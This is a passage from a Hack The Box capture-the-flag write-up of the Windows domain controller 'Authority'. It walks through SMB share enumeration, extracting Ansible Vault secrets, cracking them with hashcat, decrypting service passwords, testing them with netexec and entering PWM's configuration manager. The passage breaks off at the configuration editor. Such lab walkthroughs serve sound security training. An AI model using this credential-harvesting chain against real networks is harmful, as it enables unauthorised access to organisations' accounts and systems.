HTB: Authority
==============

![Authority](https://0xdf.gitlab.io/img/authority-cover.png)

Authority is a Windows domain controller. I’ll access open shares over SMB to find some Ansible playbooks. I’ll crack some encrypted fields to get credentials for a PWM instance. The PWM instance is in configuration mode, and I’ll use that to have it try to authenticate to my box over LDAP with plain text credentials. With those creds, I’ll enumerate active directory certificate services to find they are vulnerable to ESC1, with a twist. Rather than any user being able to enroll with the template, it’s any domain computer. I’ll add a fake computer to the domain and use that to get a certificate for the DC. That certificate doesn’t work directly, but I can use a pass-the-cert attack to dump hashes and get access as administrator.

## Box Info

Name[Authority](https://www.hackthebox.com/machines/authority) [![Authority](https://0xdf.gitlab.io/icons/box-authority.png)](https://www.hackthebox.com/machines/authority)

[Play on HackTheBox](https://www.hackthebox.com/machines/authority)Release Date[15 Jul 2023](https://twitter.com/hackthebox_eu/status/1679883569764679682)Retire Date09 Dec 2023OSWindows ![Windows](https://0xdf.gitlab.io/icons/Windows.png)Base PointsMedium \[30\]Rated Difficulty![Rated difficulty for Authority](https://0xdf.gitlab.io/img/authority-diff.png)Radar Graph![Radar chart for Authority](https://0xdf.gitlab.io/img/authority-radar.png)![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)00:34:55 [![kozmer](https://www.hackthebox.eu/badge/image/637320)](https://app.hackthebox.com/users/637320)

![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)00:45:56 [![szymex73](https://www.hackthebox.eu/badge/image/139466)](https://app.hackthebox.com/users/139466)

Creators[![mrb3n](https://www.hackthebox.eu/badge/image/2984)](https://app.hackthebox.com/users/2984)

[![Sentinal920](https://www.hackthebox.eu/badge/image/206770)](https://app.hackthebox.com/users/206770)

## Recon

### nmap

`nmap` finds a bunch of open TCP ports:

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.222
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-23 15:03 EST
Warning: 10.10.11.222 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.222
Host is up (0.10s latency).
Not shown: 65380 closed tcp ports (reset), 126 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8443/tcp  open  https-alt
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49688/tcp open  unknown
49689/tcp open  unknown
49691/tcp open  unknown
49692/tcp open  unknown
49700/tcp open  unknown
49706/tcp open  unknown
49710/tcp open  unknown
49730/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 20.53 seconds
oxdf@hacky$ nmap -p 53,80,88,135,139,389,445,595,636,3268,3269,5985,8443,9389,47001,49664-49667,49673,49688,49689,49691,49692,49700,49706,49710,49730 -sCV 10.10.11.222
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-23 15:13 EST
Nmap scan report for 10.10.11.222
Host is up (0.10s latency).

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Simple DNS Plus
80/tcp    open   http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-24 00:13:17Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-11-24T00:14:24+00:00; +4h00m08s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
445/tcp   open   microsoft-ds?
595/tcp   closed cab-protocol
636/tcp   open   ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-11-24T00:14:23+00:00; +4h00m07s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-11-24T00:14:24+00:00; +4h00m08s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3269/tcp  open   ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-11-24T00:14:23+00:00; +4h00m07s from scanner time.
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp  open   ssl/https-alt
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2023-11-08T04:11:41
|_Not valid after:  2025-11-09T15:50:05
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings:
|   FourOhFourRequest, GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Fri, 24 Nov 2023 00:13:24 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Fri, 24 Nov 2023 00:13:24 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Fri, 24 Nov 2023 00:13:30 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49673/tcp open   msrpc         Microsoft Windows RPC
49688/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open   msrpc         Microsoft Windows RPC
49691/tcp open   msrpc         Microsoft Windows RPC
49692/tcp open   msrpc         Microsoft Windows RPC
49700/tcp open   msrpc         Microsoft Windows RPC
49706/tcp open   msrpc         Microsoft Windows RPC
49710/tcp open   msrpc         Microsoft Windows RPC
49730/tcp open   msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.93%T=SSL%I=7%D=11/23%Time=655FB25C%P=x86_64-pc-linux-g
SF:nu%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;
SF:charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Fri,\x2024\x20N
SF:ov\x202023\x2000:13:24\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n\n
SF:<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm'\"
SF:/></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20
SF:GET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x20F
SF:ri,\x2024\x20Nov\x202023\x2000:13:24\x20GMT\r\nConnection:\x20close\r\n
SF:\r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x2
SF:0text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Fri,
SF:\x2024\x20Nov\x202023\x2000:13:24\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;U
SF:RL='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20\r
SF:\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r
SF:\nContent-Length:\x201936\r\nDate:\x20Fri,\x2024\x20Nov\x202023\x2000:1
SF:3:30\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20l
SF:ang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x2
SF:0Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma
SF:,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgroun
SF:d-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}
SF:\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bl
SF:ack;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</
SF:style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x20R
SF:eport</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x20th
SF:e\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p><p>
SF:<b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x20p
SF:rocess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20per
SF:ceived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x2
SF:0request\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-11-24T00:14:14
|_  start_date: N/A
|_clock-skew: mean: 4h00m07s, deviation: 0s, median: 4h00m07s
| smb2-security-mode:
|   311:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.26 seconds

```

Based on the combination of ports, this looks like a Windows domain controller that is also running an HTTP/web server on 80.

Triaging the ports, I’ll group them as follows:

- First Tier Enumeration
  - SMB (445)
  - DNS (53)
  - HTTP (80) / HTTPS (8443)
- Second Tier Enumeration
  - Kerberos (88)
  - LDAP (389, others)
  - RPC (135)
- If I find creds
  - WinRM (5985)

### SMB - TCP 445

`netexec` (formerly `crackmapexec`) shows the domain name of `authority.htb` and a hostname of `authority`:

```
oxdf@hacky$ netexec smb 10.10.11.222
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)

```

If I try to list the cred with no creds, it fails, but with some junk creds it works:

```
oxdf@hacky$ netexec smb 10.10.11.222 --shares
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [-] Error getting user: list index out of range
SMB         10.10.11.222    445    AUTHORITY        [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
oxdf@hacky$ netexec smb 10.10.11.222 -u oxdf -p '' --shares
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\oxdf:
SMB         10.10.11.222    445    AUTHORITY        [*] Enumerated shares
SMB         10.10.11.222    445    AUTHORITY        Share           Permissions     Remark
SMB         10.10.11.222    445    AUTHORITY        -----           -----------     ------
SMB         10.10.11.222    445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.10.11.222    445    AUTHORITY        C$                              Default share
SMB         10.10.11.222    445    AUTHORITY        Department Shares
SMB         10.10.11.222    445    AUTHORITY        Development     READ
SMB         10.10.11.222    445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.10.11.222    445    AUTHORITY        NETLOGON                        Logon server share
SMB         10.10.11.222    445    AUTHORITY        SYSVOL                          Logon server share

```

The “Department Shares” share is interesting, but I don’t have access.

The share I can access is “Development”. It has a single directory `Automation\Ansible` that has four directories:

```
oxdf@hacky$ smbclient -N //10.10.11.222/Development
Try "help" to get a list of possible commands.
smb: \> ls Automation\Ansible\
  .                                   D        0  Fri Mar 17 09:20:50 2023
  ..                                  D        0  Fri Mar 17 09:20:50 2023
  ADCS                                D        0  Fri Mar 17 09:20:48 2023
  LDAP                                D        0  Fri Mar 17 09:20:48 2023
  PWM                                 D        0  Fri Mar 17 09:20:48 2023
  SHARE                               D        0  Fri Mar 17 09:20:48 2023

                5888511 blocks of size 4096. 1484233 blocks available

```

Each has an Ansible setup for the given technology. For example, `ADCS`:

```
smb: \> ls Automation\Ansible\ADCS\
  .                                   D        0  Fri Mar 17 09:20:48 2023
  ..                                  D        0  Fri Mar 17 09:20:48 2023
  .ansible-lint                       A      259  Thu Sep 22 01:34:12 2022
  .yamllint                           A      205  Tue Sep  6 12:07:26 2022
  defaults                            D        0  Fri Mar 17 09:20:48 2023
  LICENSE                             A    11364  Tue Sep  6 12:07:26 2022
  meta                                D        0  Fri Mar 17 09:20:48 2023
  molecule                            D        0  Fri Mar 17 09:20:48 2023
  README.md                           A     7279  Tue Sep  6 12:07:26 2022
  requirements.txt                    A      466  Tue Sep  6 12:07:26 2022
  requirements.yml                    A      264  Tue Sep  6 12:07:26 2022
  SECURITY.md                         A      924  Tue Sep  6 12:07:26 2022
  tasks                               D        0  Fri Mar 17 09:20:48 2023
  templates                           D        0  Fri Mar 17 09:20:48 2023
  tox.ini                             A      419  Tue Sep  6 12:07:26 2022
  vars                                D        0  Fri Mar 17 09:20:48 2023

                5888511 blocks of size 4096. 1484233 blocks available

```

Active Directory Certificate Services (ADCS) is a very juicy target, but not much I can do without creds. I’ll note that one as a hint to check back on.

### DNS - TCP / UDP 53

With TCP 53 open, I’ll try a zone transfer on the domain identified by SMB enumeration:

```
oxdf@hacky$ dig axfr authority.htb @10.10.11.222

; <<>> DiG 9.18.18-0ubuntu0.22.04.1-Ubuntu <<>> axfr authority.htb @10.10.11.222
;; global options: +cmd
; Transfer failed.

```

Zone transfers aren’t allowed.

A reverse look up doesn’t give anything useful either:

```
oxdf@hacky$ dig -x 10.10.11.222 @10.10.11.222
;; communications error to 10.10.11.222#53: timed out

; <<>> DiG 9.18.16-1~deb12u1~bpo11+1-Debian <<>> -x 10.10.11.222 @10.10.11.222
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 42879
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;222.11.10.10.in-addr.arpa.     IN      PTR

;; Query time: 4700 msec
;; SERVER: 10.10.11.222#53(10.10.11.222) (UDP)
;; WHEN: Thu Nov 23 15:48:59 EST 2023
;; MSG SIZE  rcvd: 54

```

I could brute force, I’ll wait at this point. I’ll add `authority.htb` to my `/etc/hosts` file:

```
10.10.11.222 authority.htb authority.authority.htb

```

### Website - TCP 80

#### Site

The site loads the default IIS page, both by IP and by domain name:

![image-20231123160052304](https://0xdf.gitlab.io/img/image-20231123160052304.png)

#### Tech Stack

The HTTP response headers just show IIS:

```
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Tue, 09 Aug 2022 23:00:33 GMT
Accept-Ranges: bytes
ETag: "557c50d443acd81:0"
Server: Microsoft-IIS/10.0
Date: Fri, 24 Nov 2023 00:55:05 GMT
Connection: close
Content-Length: 703

```

The 404 page looks like the default IIS page:

![image-20231206130126887](https://0xdf.gitlab.io/img/image-20231206130126887.png)

I’ll take a few guesses at the index page, but everything returns 404 (which isn’t odd for an IIS server).

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```
oxdf@hacky$ feroxbuster -u http://authority.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://authority.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       32l       55w      703c http://authority.htb/
400      GET        6l       26w      324c http://authority.htb/error%1F_log
[####################] - 1m     30000/30000   0s      found:2       errors:0
[####################] - 1m     30000/30000   438/s   http://authority.htb/

```

Absolutely nothing.

### PWM - TCP 8443

#### Certificate

The TLS certificate is not useful:

![image-20231123163312293](https://0xdf.gitlab.io/img/image-20231123163312293.png)

#### Site

The web root redirects to `/pwm/`, presents an instance of [PWM](https://github.com/pwm-project/pwm):

![image-20231123164727269](https://0xdf.gitlab.io/img/image-20231123164727269.png)

PWM is:

> an open source password self-service application for LDAP directories.

Clicking on the down arrow at the top right gives more information:

![image-20231127125440973](https://0xdf.gitlab.io/img/image-20231127125440973.png)

“open configuration mode” must be why those two additional button are below the “Sign in” button. Clicking on any of them loads another screen asking for a password:

![image-20231127125640132](https://0xdf.gitlab.io/img/image-20231127125640132.png)

## Shell as svc\_ldap

### Ansible Files

#### Download

One of the directories in the SMB share was named `PWM`:

```
smb: \Automation\Ansible\PWM\> ls
  .                                   D        0  Fri Mar 17 09:20:48 2023
  ..                                  D        0  Fri Mar 17 09:20:48 2023
  ansible.cfg                         A      491  Thu Sep 22 01:36:58 2022
  ansible_inventory                   A      174  Wed Sep 21 18:19:32 2022
  defaults                            D        0  Fri Mar 17 09:20:48 2023
  handlers                            D        0  Fri Mar 17 09:20:48 2023
  meta                                D        0  Fri Mar 17 09:20:48 2023
  README.md                           A     1290  Thu Sep 22 01:35:58 2022
  tasks                               D        0  Fri Mar 17 09:20:48 2023
  templates                           D        0  Fri Mar 17 09:20:48 2023

                5888511 blocks of size 4096. 1145489 blocks available

```

I’ll download the files:

```
smb: \Automation\Ansible\> prompt off
smb: \Automation\Ansible\> recurse true
smb: \Automation\Ansible\> mget PWM
getting file \Automation\Ansible\PWM\ansible.cfg of size 491 as PWM/ansible.cfg (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
getting file \Automation\Ansible\PWM\ansible_inventory of size 174 as PWM/ansible_inventory (0.1 KiloBytes/sec) (average 0.3 KiloBytes/sec)
getting file \Automation\Ansible\PWM\README.md of size 1290 as PWM/README.md (1.0 KiloBytes/sec) (average 0.5 KiloBytes/sec)
getting file \Automation\Ansible\PWM\defaults\main.yml of size 1591 as PWM/defaults/main.yml (1.6 KiloBytes/sec) (average 0.8 KiloBytes/sec)
getting file \Automation\Ansible\PWM\handlers\main.yml of size 4 as PWM/handlers/main.yml (0.0 KiloBytes/sec) (average 0.7 KiloBytes/sec)
getting file \Automation\Ansible\PWM\meta\main.yml of size 199 as PWM/meta/main.yml (0.2 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \Automation\Ansible\PWM\tasks\main.yml of size 1832 as PWM/tasks/main.yml (1.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
getting file \Automation\Ansible\PWM\templates\context.xml.j2 of size 422 as PWM/templates/context.xml.j2 (0.4 KiloBytes/sec) (average 0.7 KiloBytes/sec)
getting file \Automation\Ansible\PWM\templates\tomcat-users.xml.j2 of size 388 as PWM/templates/tomcat-users.xml.j2 (0.5 KiloBytes/sec) (average 0.7 KiloBytes/sec)

```

#### Files

The `ansible_inventory` file has what looks like some credentials for WinRM:

```
ansible_user: administrator
ansible_password: Welcome1
ansible_port: 5985
ansible_connection: winrm
ansible_winrm_transport: ntlm
ansible_winrm_server_cert_validation: ignore

```

I’ll try those with `netexec`, but they don’t work:

```
oxdf@hacky$ netexec winrm authority.htb -u administrator -p 'Welcome1'
WINRM       10.10.11.222    5985   AUTHORITY        [*] Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb)
WINRM       10.10.11.222    5985   AUTHORITY        [-] authority.htb\administrator:Welcome1

```

`defaults/main.yml` has configuration values for PWM:

```
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764

```

### Recover Passwords

#### Format Hashes

The values in the file above are protected with [Ansible Vault](https://docs.ansible.com/ansible/2.8/user_guide/vault.html#variable-level-encryption). The Jumbo John The Ripper repo has a [script](https://github.com/openwall/john/blob/bleeding-jumbo/run/ansible2john.py), `ansible2john.py`. The script takes in a file with two lines, the first being the header and the second being the hex-encoded values above. I’ll format the three protected values into files:

```
oxdf@hacky$ ls *_vault
ldap_admin_password_vault  pwm_admin_login_vault  pwm_admin_password_vault
oxdf@hacky$ cat ldap_admin_password_vault
$ANSIBLE_VAULT;1.1;AES256
633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764
oxdf@hacky$ cat pwm_admin_login_vault
$ANSIBLE_VAULT;1.1;AES256
326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438
oxdf@hacky$ cat pwm_admin_password_vault
$ANSIBLE_VAULT;1.1;AES256
313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531

```

Now I can run `ansible2john.py` to make hashes:

```
oxdf@hacky$ python ansible2john.py ldap_admin_password_vault pwm_admin_login_vault pwm_admin_password_vault | tee vault_hashes
ldap_admin_password_vault:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
pwm_admin_login_vault:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
pwm_admin_password_vault:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5

```

#### Crack Hashes

`hashcat` can handle these:

```
$ hashcat vault_hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

16900 | Ansible Vault | Password Manager
...[snip]...
$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&*
$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&*
$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@#$%^&*
...[snip]...

```

They all have the same password, `!@#$%^&*`, which makes sense since they are encrypted in the same ansible file.

#### Decrypt

`pipx install ansible-core` installs a bunch of ansible tools, including `ansible-vault`, which can decrypt the blobs with passwords:

```
oxdf@hacky$ cat ldap_admin_password_vault | ansible-vault decrypt
Vault password:
Decryption successful
DevT3st@123
oxdf@hacky$ cat pwm_admin_login_vault | ansible-vault decrypt
Vault password:
Decryption successful
svc_pwm
oxdf@hacky$
oxdf@hacky$ cat pwm_admin_password_vault | ansible-vault decrypt
Vault password:
Decryption successful
pWm_@dm!N_!23

```

### Machine Access \[Fail\]

I’ll try this password combination with `netexec`. On SMB, it seems to work, but then it can’t access any shares:

```
oxdf@hacky$ netexec smb authority.htb -u svc_pwm -p 'pWm_@dm!N_!23'
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\svc_pwm:pWm_@dm!N_!23
oxdf@hacky$ netexec smb authority.htb -u svc_pwm -p 'pWm_@dm!N_!23' --shares
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\svc_pwm:pWm_@dm!N_!23
SMB         10.10.11.222    445    AUTHORITY        [-] Error enumerating shares: STATUS_ACCESS_DENIED

```

It can’t access WinRM and fails to access LDAP for some reason:

```
oxdf@hacky$ netexec winrm authority.htb -u svc_pwm -p 'pWm_@dm!N_!23'
WINRM       10.10.11.222    5985   AUTHORITY        [*] Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb)
WINRM       10.10.11.222    5985   AUTHORITY        [-] authority.htb\svc_pwm:pWm_@dm!N_!23
oxdf@hacky$ netexec ldap 10.10.11.222 -u svc_pwm -p 'pWm_@dm!N_!23'
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.222    445    AUTHORITY        [-] authority.htb\svc_pwm:pWm_@dm!N_!23 Error connecting to the domain, are you sure LDAP service is running on the target?
Error: [Errno Connection error (authority.authority.htb:389)] [Errno -2] Name or service not known

```

Not accessing LDAP seems like a problem for PWM.

### PWM Access

#### Login Fail

On the PWM login screen, I’ll enter the credentials and hit “Sign in”:

![image-20231127125337887](https://0xdf.gitlab.io/img/image-20231127125337887.png)

The result is this popup:

![image-20231127125309961](https://0xdf.gitlab.io/img/image-20231127125309961.png)

This looks similar to what I was getting with `netexec`.

#### Configuration Manager

The password `pWm_@dm!N_!23` works to log into the configuration manager:

![image-20231127125848531](https://0xdf.gitlab.io/img/image-20231127125848531.png)

PWM is running out of `C:\pwm`.

#### Configuration Editor

